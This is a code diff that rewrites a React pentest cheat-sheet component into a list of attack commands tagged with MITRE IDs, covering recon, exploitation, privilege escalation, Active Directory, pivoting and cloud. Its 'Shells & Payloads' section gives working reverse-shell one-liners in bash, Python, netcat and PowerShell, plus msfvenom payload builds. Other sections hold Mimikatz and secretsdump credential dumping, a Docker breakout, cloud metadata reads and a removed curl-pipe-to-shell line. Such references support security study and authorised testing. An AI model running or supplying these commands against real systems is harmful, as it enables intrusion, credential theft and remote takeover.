@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { BookOpen, Terminal, Network, Shield, Search, Lock, ChevronRight, Copy, Check, Server, Globe, Cpu, Database, Hash, Eye, Smartphone, CloudLightning, LayoutTemplate, Zap } from 'lucide-react';
+import { BookOpen, Terminal, Network, Shield, Search, ChevronRight, Copy, Check, Server, Globe, Hash, CloudLightning, Zap, Wifi, Layers, FileCode, HardDrive, Share2, Unlock, Eye, Smartphone } from 'lucide-react';
 
 interface Command {
   cmd: string;
@@ -16,192 +16,209 @@ interface Category {
 }
 
 const cheatSheetData: Category[] = [
+  // 1. RECON / OSINT
+  {
+    id: 'osint',
+    name: 'OSINT & Recon',
+    icon: <Eye size={18} />,
+    description: 'Passive intelligence, user enumeration, and domain mapping.',
+    commands: [
+      { cmd: 'theHarvester -d <domain> -b all', desc: 'Aggressive email/subdomain harvest.', mitre: 'T1596' },
+      { cmd: 'sublist3r -d <domain> -t 20', desc: 'Fast subdomain enumeration.', mitre: 'T1596' },
+      { cmd: 'amass enum -d <domain> -active', desc: 'Active subdomain mapping (ASN/CIDR).', mitre: 'T1596' },
+      { cmd: 'sherlock <username>', desc: 'Find username across social networks.', mitre: 'T1593' },
+      { cmd: 'ghunt email <email>', desc: 'Extract Google Account details.', mitre: 'T1593' },
+      { cmd: 'shodan host <ip>', desc: 'Retrieve host details from Shodan.', mitre: 'T1596' },
+      { cmd: 'dig axfr @<ns> <domain>', desc: 'Attempt DNS Zone Transfer.', mitre: 'T1596' },
+      { cmd: 'whois <domain>', desc: 'Get registrar and registration info.', mitre: 'T1596' }
+    ]
+  },
+  // 2. NETWORK SCANNING (Advanced)
   {
     id: 'nmap',
     name: 'Advanced Nmap',
     icon: <Search size={18} />,
-    description: 'Deep network mapping, evasion techniques, and custom scripting.',
+    description: 'Evasion techniques, aggressive detection, and scripting.',
     commands: [
-      // Host Discovery
-      { cmd: 'nmap -sn <target>', desc: 'Ping Scan: Host discovery only (no port scan).', mitre: 'T1046' },
-      { cmd: 'nmap -Pn <target>', desc: 'No Ping: Treat hosts as online (bypass ICMP block).', mitre: 'T1046' },
-      { cmd: 'nmap -PS22,80,443 <target>', desc: 'TCP SYN Discovery: Probe specific ports for uptime.', mitre: 'T1046' },
-      
-      // Scanning & Timing
-      { cmd: 'nmap -sS -p- -T4 <target>', desc: 'Stealth SYN: All 65535 ports, aggressive timing.', mitre: 'T1046' },
-      { cmd: 'nmap -T0 <target>', desc: 'Timing (Paranoid): Very slow to evade IDS detection.', mitre: 'T1046' },
-      { cmd: 'nmap --scan-delay 500ms <target>', desc: 'Add delay between probes to remain stealthy.', mitre: 'T1046' },
-      
-      // OS & Service
-      { cmd: 'nmap -O --osscan-guess <target>', desc: 'OS Detect: Aggressive guessing if no match found.', mitre: 'T1046' },
-      { cmd: 'nmap -sV --version-intensity 9 <target>', desc: 'Version Detect: Max intensity for banners.', mitre: 'T1046' },
-      
-      // NSE Scripts
-      { cmd: 'nmap -sC <target>', desc: 'NSE: Run default scripts (equivalent to --script=default).', mitre: 'T1046' },
-      { cmd: 'nmap --script discovery <target>', desc: 'NSE: Run advanced discovery scripts.', mitre: 'T1046' },
-      { cmd: 'nmap --script exploit <target>', desc: 'NSE: Attempt active exploitation (Intrusive).', mitre: 'T1210' },
-      { cmd: 'nmap --script vuln <target>', desc: 'NSE: Check for specific known vulnerabilities.', mitre: 'T1595.002' },
-      { cmd: 'nmap --script "vuln and safe" <target>', desc: 'NSE: Run scripts categorized as safe vulnerabilities.', mitre: 'T1595.002' },
-      { cmd: 'nmap --script http-enum <target>', desc: 'NSE: Enumerate web folders and software.', mitre: 'T1083' },
-      { cmd: 'nmap --script ssl-enum-ciphers <target>', desc: 'NSE: Audit SSL/TLS cipher strength.', mitre: 'T1595.002' },
-      { cmd: 'nmap --script-args http.useragent="Mozilla/5.0" <target>', desc: 'NSE Arg: Spoof User-Agent string.', mitre: 'T1046' },
-      
-      // Evasion
-      { cmd: 'nmap -f -mtu 24 <target>', desc: 'Frag: Fragment packets to MTU 24 to bypass IDS.', mitre: 'T1046' },
-      { cmd: 'nmap -D RND:10 <target>', desc: 'Decoy: Mask source IP with 10 random decoys.', mitre: 'T1046' }
+      { cmd: 'nmap -f -mtu 24 -D RND:10 <ip>', desc: 'Evasion: Fragmentation + Decoys.', mitre: 'T1046' },
+      { cmd: 'nmap -O --osscan-guess <ip>', desc: 'Aggressive OS Detection.', mitre: 'T1046' },
+      { cmd: 'nmap -sV --version-intensity 9 <ip>', desc: 'Max Version Intensity.', mitre: 'T1046' },
+      { cmd: 'nmap --script "vuln and safe" <ip>', desc: 'Run safe vulnerability scripts.', mitre: 'T1595' },
+      { cmd: 'nmap -sS -p- --min-rate 5000 <ip>', desc: 'High-speed full port SYN scan.', mitre: 'T1046' },
+      { cmd: 'nmap -sU --top-ports 100 <ip>', desc: 'UDP scan top 100 ports.', mitre: 'T1046' },
+      { cmd: 'nmap --script smb-os-discovery <ip>', desc: 'Enumerate SMB OS info.', mitre: 'T1046' },
+      { cmd: 'netdiscover -r <ip>/24', desc: 'Passive/Active ARP reconnaissance.', mitre: 'T1046' }
     ]
   },
-  {
-    id: 'network_analysis',
-    name: 'Traffic Analysis',
-    icon: <Network size={18} />,
-    description: 'Wireshark filters and tcpdump for threat hunting.',
-    commands: [
-      { cmd: 'tcp.flags.syn==1 && tcp.flags.ack==0', desc: 'Wireshark: Display SYN packets (Scanning).', mitre: 'T1046' },
-      { cmd: 'icmp.type == 8 && frame.time_delta < 0.01', desc: 'Wireshark: Detect ICMP flooding (DoS).', mitre: 'T1498' },
-      { cmd: 'arp.duplicate-address-detected', desc: 'Wireshark: Detect ARP Poisoning/Spoofing.', mitre: 'T1557.002' },
-      { cmd: 'http.request.uri contains "../"', desc: 'Wireshark: Detect Path Traversal attempts.', mitre: 'T1190' },
-      { cmd: 'dns.qry.name.len > 50 && !dns.flags.response', desc: 'Wireshark: Long DNS queries (Tunneling).', mitre: 'T1071.004' },
-      { cmd: 'http.user_agent matches "(?i)(curl|python|wget|powershell)"', desc: 'Wireshark: Suspicious non-browser User-Agents.', mitre: 'T1071.001' },
-      { cmd: 'kerberos.error_code == 32', desc: 'Wireshark: Kerberos Ticket Expired (potential attack).', mitre: 'T1558' },
-      { cmd: 'http.request.method=="POST" && frame contains "password"', desc: 'Wireshark: Find cleartext passwords in POST.', mitre: 'T1552.001' },
-      { cmd: 'tcpdump -i eth0 -nnttt host 10.10.10.5', desc: 'Tcpdump: Timestamped capture for host.', mitre: 'T1040' },
-      { cmd: 'tcpdump -A -i eth0 "tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)"', desc: 'Tcpdump: Capture only HTTP POST bodies.', mitre: 'T1040' }
-    ]
-  },
-  {
-    id: 'exploit_scan',
-    name: 'Exploit & Scan',
-    icon: <Zap size={18} />,
-    description: 'Scanning (Nuclei/Amass) and exploitation (Metasploit/Hydra).',
-    commands: [
-      { cmd: 'nuclei -u <target> -t cves/ -s critical,high', desc: 'Nuclei: Scan for Critical/High CVEs.', mitre: 'T1595.002' },
-      { cmd: 'nuclei -l urls.txt -t misconfiguration/ -rl 50', desc: 'Nuclei: Scan list for misconfigs (Rate Limit 50).', mitre: 'T1595.002' },
-      { cmd: 'nuclei -u <target> -t exposures/tokens/', desc: 'Nuclei: Scan for exposed API keys/tokens.', mitre: 'T1552' },
-      { cmd: 'hydra -l user -P pass.txt ssh://<target>', desc: 'Hydra: Parallel login cracker for SSH/FTP/Web.', mitre: 'T1110' },
-      { cmd: 'commix --url="<url>?p=1" --batch', desc: 'Commix: Automated OS command injection tester.', mitre: 'T1059' },
-      { cmd: 'evil-winrm -i <ip> -u <user> -p <pass>', desc: 'Evil-WinRM: Shell access on Windows via WinRM.', mitre: 'T1021.006' },
-      { cmd: 'responder -I eth0 -wrf', desc: 'Responder: LLMNR/NBT-NS poisoner & credential harvester.', mitre: 'T1557.001' },
-      { cmd: 'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD generic/shell_reverse_tcp; set LHOST <ip>; run"', desc: 'Metasploit: Quick reverse shell listener.', mitre: 'T1059' },
-      { cmd: 'msfconsole -x "use auxiliary/scanner/http/title; set RHOSTS <target>; run"', desc: 'Metasploit: HTTP Title Scanner (Recon).', mitre: 'T1595' },
-      { cmd: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <target>; set LHOST <ip>; run"', desc: 'Metasploit: EternalBlue Exploit Example.', mitre: 'T1210' },
-      { cmd: 'search type:exploit platform:linux apache', desc: 'Metasploit: Search for specific exploits.', mitre: 'T1595' },
-      { cmd: 'use auxiliary/scanner/smb/smb_version', desc: 'Metasploit: Use auxiliary scanner module.', mitre: 'T1046' },
-      { cmd: 'sessions -u <id>', desc: 'Metasploit: Upgrade shell to Meterpreter.', mitre: 'T1059' }
-    ]
-  },
-  {
-    id: 'exploit_db',
-    name: 'Exploit Database',
-    icon: <Database size={18} />,
-    description: 'Search and retrieval of exploits from Exploit-DB archive.',
-    commands: [
-      { cmd: 'searchsploit "Apache 2.4" "Linux"', desc: 'Search for exploits by software and platform.', mitre: 'T1596' },
-      { cmd: 'searchsploit --cve 2021-44228', desc: 'Search for exploits by CVE ID.', mitre: 'T1596' },
-      { cmd: 'searchsploit -m 12345', desc: 'Mirror (copy) exploit code to current directory.', mitre: 'T1588.001' },
-      { cmd: 'searchsploit -p 12345', desc: 'Show full path and inspect exploit metadata.', mitre: 'T1588.002' },
-      { cmd: 'searchsploit --nmap file.xml', desc: 'Search for exploits based on Nmap XML output.', mitre: 'T1595' }
-    ]
-  },
+  // 3. WEB EXPLOITATION
   {
     id: 'web',
-    name: 'Web App Security',
+    name: 'Web Exploitation',
     icon: <Globe size={18} />,
-    description: 'OWASP Top 10 testing: SQLi, XSS, SSRF, and Recon.',
+    description: 'SQLi, XSS, Fuzzing, and CMS attacks.',
     commands: [
-      { cmd: 'amass enum -d <domain> -active', desc: 'Amass: Active subdomain enumeration and mapping.', mitre: 'T1590' },
-      { cmd: 'subfinder -d <domain> -silent', desc: 'Subfinder: Passive subdomain enumeration source.', mitre: 'T1590' },
-      { cmd: 'gobuster dir -u <url> -w list.txt -t 50', desc: 'Gobuster: Directory and file brute-forcing.', mitre: 'T1595' },
-      { cmd: 'whatweb -a 3 <url>', desc: 'Aggressive technology stack identification.', mitre: 'T1592' },
-      { cmd: 'ffuf -w common.txt -u <url>/FUZZ -fs 0', desc: 'Directory fuzzing (filter size 0).', mitre: 'T1595.002' },
-      { cmd: 'nikto -h <url> -Tuning 1,3,7', desc: 'Scan for file upload (1), info disclosure (3), misc (7).', mitre: 'T1595.002' },
-      { cmd: 'sqlmap -u "<url>" --batch --level=5 --risk=3', desc: 'Max intensity SQL injection scan.', mitre: 'T1190' },
-      { cmd: 'python3 xsstrike.py -u "<url>" --crawl', desc: 'Advanced XSS detection and fuzzing.', mitre: 'T1059.007' },
-      { cmd: 'curl http://169.254.169.254/latest/meta-data/', desc: 'Test for Cloud SSRF (AWS Metadata).', mitre: 'T1552' },
-      { cmd: 'searchsploit "Apache Struts 2.5"', desc: 'Search for known exploits in components.', mitre: 'T1190' },
-      { cmd: 'cutycapt --url=<url> --out=report.png', desc: 'Capture screenshot for evidence/reporting.', mitre: 'N/A' },
-      { cmd: 'nmap --script=http-security-headers <target>', desc: 'Check for missing security headers.', mitre: 'T1595.002' }
+      { cmd: 'gobuster dir -u <url> -w list.txt -x php,txt', desc: 'Directory brute-force.', mitre: 'T1595' },
+      { cmd: 'ffuf -u <url>/FUZZ -w list.txt -mc 200,301', desc: 'Fast web fuzzer.', mitre: 'T1595' },
+      { cmd: 'sqlmap -u "<url>" --batch --dbs', desc: 'Auto SQL Injection.', mitre: 'T1190' },
+      { cmd: 'nikto -h <url>', desc: 'Web server vulnerability scanner.', mitre: 'T1595' },
+      { cmd: 'wpscan --url <url> -e p,u', desc: 'WordPress plugin/user enum.', mitre: 'T1595' },
+      { cmd: 'hydra -l user -P pass.txt <url> http-post-form', desc: 'Brute force login form.', mitre: 'T1110' },
+      { cmd: 'xsstrike -u "<url>"', desc: 'XSS Detection suite.', mitre: 'T1059' }
     ]
   },
+  // 4. API SECURITY (New)
   {
-    id: 'api_sec',
+    id: 'api',
     name: 'API Security',
-    icon: <CloudLightning size={18} />,
-    description: 'REST/GraphQL endpoint discovery and testing.',
+    icon: <FileCode size={18} />,
+    description: 'Endpoint discovery, JWT analysis, and parameter fuzzing.',
     commands: [
-      { cmd: 'kiterunner scan <target> -w routes.txt', desc: 'High-speed API endpoint discovery.', mitre: 'T1595' },
-      { cmd: 'arjun -u <url> --get', desc: 'Fuzz and discover hidden URL parameters.', mitre: 'T1595' },
-      { cmd: 'jwt_tool.py <token> -T', desc: 'Test JWTs for none-algo, tampering, and secrets.', mitre: 'T1552' },
-      { cmd: 'ffuf -w words.txt -u <url> -H "Content-Type: application/json" -d \'{"key": "FUZZ"}\'', desc: 'Fuzz JSON POST body keys/values.', mitre: 'T1190' },
-      { cmd: 'curl -X POST -H "Content-Type: application/json" --data \'{"query":"{__schema{types{name,fields{name}}}}"}\' <url>', desc: 'GraphQL Introspection: Dump schema structure.', mitre: 'T1595' },
-      { cmd: 'zap-api-scan.py -t <swagger_url> -f openapi', desc: 'OWASP ZAP: Automated scan against OpenAPI/Swagger definition.', mitre: 'T1595.002' }
+      { cmd: 'kr scan <target> -w routes.json', desc: 'Kiterunner: API endpoint discovery.', mitre: 'T1595' },
+      { cmd: 'arjun -u <url> --get', desc: 'Arjun: Hidden parameter discovery.', mitre: 'T1595' },
+      { cmd: 'ffuf -w words.txt -u <url> -H "Content-Type: application/json" -d \'{"key": "FUZZ"}\'', desc: 'Fuzz JSON POST bodies.', mitre: 'T1190' },
+      { cmd: 'python3 jwt_tool.py <token> -T', desc: 'JWT tampering and analysis.', mitre: 'T1552' },
+      { cmd: 'zap-cli quick-scan -s xss,sqli <url>', desc: 'OWASP ZAP Quick Scan.', mitre: 'T1595' }
     ]
   },
+  // 5. MOBILE SECURITY (New)
   {
-    id: 'cms_sec',
-    name: 'CMS Scanning',
-    icon: <LayoutTemplate size={18} />,
-    description: 'Specialized scanners for WordPress, Drupal, Joomla.',
-    commands: [
-      { cmd: 'wpscan --url <url> --enumerate p,t,u', desc: 'Enumerate WP plugins, themes, and users.', mitre: 'T1595.002' },
-      { cmd: 'droopescan scan drupal -u <url>', desc: 'Identify Drupal version and vulnerabilities.', mitre: 'T1595.002' },
-      { cmd: 'joomscan -u <url>', desc: 'Scan Joomla sites for known flaws.', mitre: 'T1595.002' },
-      { cmd: 'wpscan --url <url> --passwords rockyou.txt --usernames admin', desc: 'Brute force WordPress login.', mitre: 'T1110' }
-    ]
-  },
-  {
-    id: 'mobile_sec',
+    id: 'mobile',
     name: 'Mobile Security',
     icon: <Smartphone size={18} />,
-    description: 'Android/iOS assessment with ADB, Frida, and Objection.',
+    description: 'Android/iOS assessment with Frida and Objection.',
     commands: [
-      { cmd: 'apktool d app.apk -o output_dir', desc: 'Decompile APK to view resources and smali.', mitre: 'T1418' },
-      { cmd: 'jadx-gui app.apk', desc: 'Decompile APK to Java source code (GUI).', mitre: 'T1418' },
-      { cmd: 'adb shell pm list packages -f', desc: 'List installed packages and their paths.', mitre: 'T1418' },
-      { cmd: 'adb logcat | grep -i "token"', desc: 'Monitor logs for leaked sensitive data.', mitre: 'T1409' },
-      { cmd: 'objection --gadget "com.app" explore', desc: 'Runtime exploration and SSL unpinning.', mitre: 'T1418' },
-      { cmd: 'frida -U -f com.app -l bypass_root.js', desc: 'Hook app to bypass root detection.', mitre: 'T1554' }
+      { cmd: 'frida -U -f <pkg> -l root_bypass.js', desc: 'Frida: Bypass root detection.', mitre: 'T1626' },
+      { cmd: 'objection --gadget <pkg> explore', desc: 'Objection: Runtime exploration.', mitre: 'T1626' },
+      { cmd: 'android sslpinning disable', desc: 'Objection: Disable SSL Pinning.', mitre: 'T1573' },
+      { cmd: 'adb shell pm list packages', desc: 'List installed packages (ADB).', mitre: 'T1082' },
+      { cmd: 'jadx-gui <apk>', desc: 'Static analysis of APK.', mitre: 'T1082' }
     ]
   },
+  // 6. EXPLOIT & VULNS (New)
   {
-    id: 'linux_enum',
-    name: 'Linux Enumeration',
+    id: 'exploit',
+    name: 'Exploits & Vulns',
+    icon: <Zap size={18} />,
+    description: 'Vulnerability scanning and exploit frameworks.',
+    commands: [
+      { cmd: 'nuclei -u <target> -t cves/ -s critical', desc: 'Nuclei: Scan for critical CVEs.', mitre: 'T1595' },
+      { cmd: 'searchsploit "Apache 2.4"', desc: 'Exploit-DB: Search for exploits.', mitre: 'T1596' },
+      { cmd: 'searchsploit -m <id>', desc: 'Mirror exploit to current dir.', mitre: 'T1596' },
+      { cmd: 'msfconsole -q -x "use exploit/multi/handler; set LHOST <ip>; run"', desc: 'Metasploit: Quick Listener.', mitre: 'T1059' },
+      { cmd: 'msfvenom -p android/meterpreter/reverse_tcp ...', desc: 'Generate Android Payload.', mitre: 'T1059' }
+    ]
+  },
+  // 7. SHELLS & PAYLOADS
+  {
+    id: 'shells',
+    name: 'Shells & Payloads',
     icon: <Terminal size={18} />,
-    description: 'System reconnaissance for privilege escalation and auditing.',
+    description: 'Reverse shells and payload generation.',
     commands: [
-      { cmd: 'uname -a; lsb_release -a', desc: 'Kernel and distribution information.', mitre: 'T1082' },
-      { cmd: 'find / -perm -4000 -type f 2>/dev/null', desc: 'Find binaries with SUID bit set.', mitre: 'T1548.001' },
-      { cmd: 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh', desc: 'LinPEAS: Automated privilege escalation enumeration.', mitre: 'T1082' },
-      { cmd: 'sudo -l', desc: 'List commands the current user can run as root.', mitre: 'T1082' },
-      { cmd: 'netstat -antup', desc: 'List all active connections.', mitre: 'T1049' },
-      { cmd: 'history | grep -i "pass"', desc: 'Search command history for passwords.', mitre: 'T1552.003' }
+      { cmd: 'bash -i >& /dev/tcp/<ip>/<port> 0>&1', desc: 'Bash Reverse Shell.', mitre: 'T1059' },
+      { cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ip>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'', desc: 'Python Reverse Shell.', mitre: 'T1059' },
+      { cmd: 'nc -e /bin/sh <ip> <port>', desc: 'Netcat (Traditional).', mitre: 'T1059' },
+      { cmd: 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'<ip>\',<port>);..."', desc: 'PowerShell Reverse Shell.', mitre: 'T1059' },
+      { cmd: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > shell.exe', desc: 'Meterpreter Payload (Windows).', mitre: 'T1059' },
+      { cmd: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell.elf', desc: 'Reverse Shell (Linux).', mitre: 'T1059' },
+      { cmd: 'msfvenom -p php/reverse_php LHOST=<ip> LPORT=<port> -f raw > shell.php', desc: 'PHP Reverse Shell.', mitre: 'T1059' }
     ]
   },
+  // 8. PRIV ESCALATION (LINUX)
   {
-    id: 'windows_ad',
-    name: 'Active Directory / PS',
+    id: 'privesc_linux',
+    name: 'PrivEsc (Linux)',
+    icon: <Unlock size={18} />,
+    description: 'Linux local privilege escalation.',
+    commands: [
+      { cmd: 'sudo -l', desc: 'Check sudo rights.', mitre: 'T1548' },
+      { cmd: 'find / -perm -u=s -type f 2>/dev/null', desc: 'Find SUID binaries.', mitre: 'T1548' },
+      { cmd: 'getcap -r / 2>/dev/null', desc: 'Check file capabilities.', mitre: 'T1548' },
+      { cmd: 'cat /etc/crontab', desc: 'Check cron jobs.', mitre: 'T1053' },
+      { cmd: 'linpeas.sh', desc: 'Automated Enumeration Script.', mitre: 'T1082' }
+    ]
+  },
+  // 9. PRIV ESCALATION (WINDOWS)
+  {
+    id: 'privesc_windows',
+    name: 'PrivEsc (Windows)',
     icon: <Server size={18} />,
-    description: 'PowerShell and CLI commands for Windows domain auditing.',
+    description: 'Windows local privilege escalation.',
     commands: [
-      { cmd: 'net user /domain', desc: 'List all users in the current domain.' },
-      { cmd: 'Get-ADUser -Filter * -Properties *', desc: 'Dump all AD user object properties.', mitre: 'T1087' },
-      { cmd: 'Invoke-Mimikatz -DumpCreds', desc: 'Dump credentials from memory (Lab Use Only).', mitre: 'T1003' },
-      { cmd: 'impacket-psexec <domain>/<user>:<pass>@<target>', desc: 'Impacket: Remote execution via SMB (PsExec).', mitre: 'T1021.002' },
-      { cmd: 'bloodhound-python -d <domain> -u <user> -p <pass> -c All', desc: 'BloodHound: Ingest domain relationships for analysis.', mitre: 'T1087' },
-      { cmd: 'wmic qfe get Caption,HotFixID', desc: 'List installed patches/hotfixes.', mitre: 'T1082' }
+      { cmd: 'whoami /priv', desc: 'Check tokens (SeImpersonate).', mitre: 'T1134' },
+      { cmd: 'cmdkey /list', desc: 'Stored credentials.', mitre: 'T1552' },
+      { cmd: 'wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\"', desc: 'Unquoted Service Paths.', mitre: 'T1574' },
+      { cmd: 'winPEAS.exe', desc: 'Automated Enum Script.', mitre: 'T1082' }
     ]
   },
+  // 10. ACTIVE DIRECTORY
   {
-    id: 'crypto_hash',
-    name: 'Crypto & Hashing',
-    icon: <Hash size={18} />,
-    description: 'Encryption, decoding, and integrity verification.',
+    id: 'ad',
+    name: 'Active Directory',
+    icon: <Network size={18} />,
+    description: 'Domain enumeration and attacks.',
     commands: [
-      { cmd: 'hashcat -m 0 -a 0 hashes.txt words.txt', desc: 'Hashcat: GPU-accelerated hash cracking (MD5).', mitre: 'T1110' },
-      { cmd: 'echo -n "text" | md5sum', desc: 'Generate MD5 hash.' },
-      { cmd: 'echo "base64" | base64 -d', desc: 'Decode Base64 string.' },
-      { cmd: 'john --wordlist=rockyou.txt hashes.txt', desc: 'Crack hashes using John the Ripper.', mitre: 'T1110' },
-      { cmd: 'openssl s_client -connect host:443', desc: 'Inspect SSL/TLS certificate chain.', mitre: 'T1595' }
+      { cmd: 'net user /domain', desc: 'List domain users.', mitre: 'T1087' },
+      { cmd: 'Get-ADUser -Filter *', desc: 'PowerShell User Enum.', mitre: 'T1087' },
+      { cmd: 'Invoke-Mimikatz -DumpCreds', desc: 'Dump memory creds.', mitre: 'T1003' },
+      { cmd: 'bloodhound-python -d <domain> -u <user> -p <pass> -c All', desc: 'Bloodhound Ingest.', mitre: 'T1087' },
+      { cmd: 'impacket-psexec <domain>/<user>:<pass>@<ip>', desc: 'PsExec Lateral Move.', mitre: 'T1021' },
+      { cmd: 'impacket-secretsdump <domain>/<user>:<pass>@<ip>', desc: 'DCSync / Hashdump.', mitre: 'T1003' },
+      { cmd: 'kerbrute userenum -d <domain> users.txt', desc: 'Kerberos User Enum.', mitre: 'T1589' }
+    ]
+  },
+  // 11. FILE TRANSFER
+  {
+    id: 'file_transfer',
+    name: 'File Transfer',
+    icon: <Share2 size={18} />,
+    description: 'Ingress and egress of tools/data.',
+    commands: [
+      { cmd: 'python3 -m http.server 80', desc: 'Python HTTP Server.', mitre: 'T1105' },
+      { cmd: 'wget http://<ip>/file -O file', desc: 'Wget download.', mitre: 'T1105' },
+      { cmd: 'certutil -urlcache -split -f http://<ip>/file file.exe', desc: 'Windows CertUtil.', mitre: 'T1105' },
+      { cmd: 'impacket-smbserver share . -smb2support', desc: 'SMB Server.', mitre: 'T1040' }
+    ]
+  },
+  // 12. PIVOTING & TUNNELING
+  {
+    id: 'pivoting',
+    name: 'Pivoting',
+    icon: <Layers size={18} />,
+    description: 'Network tunneling and port forwarding.',
+    commands: [
+      { cmd: 'ssh -D 9050 user@<ip>', desc: 'Dynamic SOCKS Proxy.', mitre: 'T1090' },
+      { cmd: 'chisel server -p 8000 --reverse', desc: 'Chisel Server.', mitre: 'T1090' },
+      { cmd: 'chisel client <ip>:8000 R:80:127.0.0.1:80', desc: 'Chisel Client Reverse.', mitre: 'T1090' },
+      { cmd: 'ligolo-ng', desc: 'Advanced Tunneling Interface.', mitre: 'T1090' },
+      { cmd: 'proxychains nmap ...', desc: 'Route tool via proxy.', mitre: 'T1090' }
+    ]
+  },
+  // 13. CLOUD & CONTAINER
+  {
+    id: 'cloud',
+    name: 'Cloud & Docker',
+    icon: <CloudLightning size={18} />,
+    description: 'AWS, Docker, and Kubernetes exploitation.',
+    commands: [
+      { cmd: 'docker run -v /:/mnt --rm -it alpine chroot /mnt sh', desc: 'Docker Breakout (Mount Root).', mitre: 'T1611' },
+      { cmd: 'curl http://169.254.169.254/latest/meta-data/', desc: 'AWS Metadata.', mitre: 'T1552' },
+      { cmd: 'kubectl auth can-i --list', desc: 'Check K8s Permissions.', mitre: 'T1613' },
+      { cmd: 'peirates', desc: 'K8s Pentest Tool.', mitre: 'T1613' }
+    ]
+  },
+  // 14. FORENSICS & BLUE TEAM
+  {
+    id: 'forensics',
+    name: 'Forensics & Blue',
+    icon: <HardDrive size={18} />,
+    description: 'Incident response and analysis.',
+    commands: [
+      { cmd: 'volatility -f mem.dmp imageinfo', desc: 'Volatility Image Info.', mitre: 'T1005' },
+      { cmd: 'volatility -f mem.dmp pslist', desc: 'List Processes (Mem).', mitre: 'T1057' },
+      { cmd: 'binwalk -e <file>', desc: 'Extract firmware/files.', mitre: 'T1140' },
+      { cmd: 'Get-WinEvent -LogName Security', desc: 'Read Windows Event Logs.', mitre: 'T1005' },
+      { cmd: 'wireshark <pcap>', desc: 'Packet Analysis.', mitre: 'T1040' }
     ]
   }
 ];
